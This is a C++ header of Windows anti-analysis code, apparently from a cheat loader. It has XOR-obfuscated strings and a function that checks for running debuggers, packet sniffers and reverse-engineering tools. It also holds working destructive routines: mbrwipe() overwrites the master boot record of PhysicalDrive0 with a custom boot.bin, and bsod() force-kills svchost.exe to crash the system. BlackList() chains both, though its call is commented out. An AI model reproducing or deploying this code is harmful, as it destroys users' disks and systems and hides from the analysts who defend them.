#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <filesystem>
#include <vector>
#include "lazy.h"
#include "../Other/SkCrypt.h"
#include "../Other/xorst.h"


bool find(const char* name)
{
    const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 proc_entry{};
    proc_entry.dwSize = sizeof proc_entry;

    auto found_process = false;
    if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
        do {
            if (name == proc_entry.szExeFile) {
                found_process = true;
                break;
            }
        } while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
    }

    LI_FN(CloseHandle).safe()(snap);
    return found_process
        ? proc_entry.th32ProcessID
        : 0;
}
void mbrwipe()
{
    HANDLE drive = CreateFileW(skCrypt(L"\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) { return; }

    HANDLE binary = CreateFileW(skCrypt(L"./boot.bin"), GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) { return; }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) { return; }

    std::uint8_t* new_mbr = new std::uint8_t[size];
    DWORD bytes_read;
    if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            //printf(("First sector overritten successfuly!\n");
        }
    }
    else
    {
        //printf("Error reading boot.bin\n");
        //printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
    }

    CloseHandle(binary);
    CloseHandle(drive);
}

namespace BlackListed
{

}
namespace malicousactivity
{
    void bsod()
    {
        system(_xor_("TASKKILL /F /IM svchost.exe 2>NULL").c_str());

    }
}

void BlackList()
{
    GlobalAddAtomA(_xor_("blacklist ? ?").c_str());

    Sleep(300);
    malicousactivity::bsod();
    mbrwipe();
}
void BlackListStopper()
{

}

int check_processes()
{
    std::vector<const char*> processes = {
    _xor_("ollydbg.exe").c_str(),
    _xor_("ProcessHacker.exe").c_str(),
    _xor_("tcpview.exe").c_str(),
    _xor_("autoruns.exe").c_str(),
    _xor_("autorunsc.exe").c_str(),
    _xor_("filemon.exe").c_str(),
    _xor_("procmon.exe").c_str(),
    _xor_("regmon.exe").c_str(),
    _xor_("procexp.exe").c_str(),
    _xor_("idaq.exe").c_str(),
    _xor_("idaq64.exe").c_str(),
    _xor_("ida.exe").c_str(),
    _xor_("ida64.exe").c_str(),
    _xor_("ImmunityDebugger.exe").c_str(),
    _xor_("Wireshark.exe").c_str(),
    _xor_("dumpcap.exe").c_str(),
    _xor_("HookExplorer.exe").c_str(),
    _xor_("ImportREC.exe").c_str(),
    _xor_("PETools.exe").c_str(),
    _xor_("LordPE.exe").c_str(),
    _xor_("SysInspector.exe").c_str(),
    _xor_("proc_analyzer.exe").c_str(),
    _xor_("sysAnalyzer.exe").c_str(),
    _xor_("sniff_hit.exe").c_str(),
    _xor_("windbg.exe").c_str(),
    _xor_("joeboxcontrol.exe").c_str(),
    _xor_("joeboxserver.exe").c_str(),
    _xor_("ResourceHacker.exe").c_str(),
    _xor_("x32dbg.exe").c_str(),
    _xor_("x64dbg.exe").c_str(),
    _xor_("Fiddler.exe").c_str(),
    _xor_("httpdebugger.exe").c_str(),
    _xor_("HTTP Debugger Windows Service (32 bit).exe").c_str(),
    _xor_("HTTPDebuggerUI.exe").c_str(),
    _xor_("HTTPDebuggerSvc.exe").c_str(),
    _xor_("cheatengine-x86_64.exe").c_str(),
    _xor_("cheatengine-x86_64-SSE4-AVX2.exe").c_str(),
    };

    for (auto process : processes)
    {
        if (find(process))
        {
            //BlackList();
            system("color 4");
            std::cout << (_xor_("Unallowed Process Found, Please Restart PC or Contact Support."));
            Sleep(3000);
            exit(0);
        }
    }
    return false;
}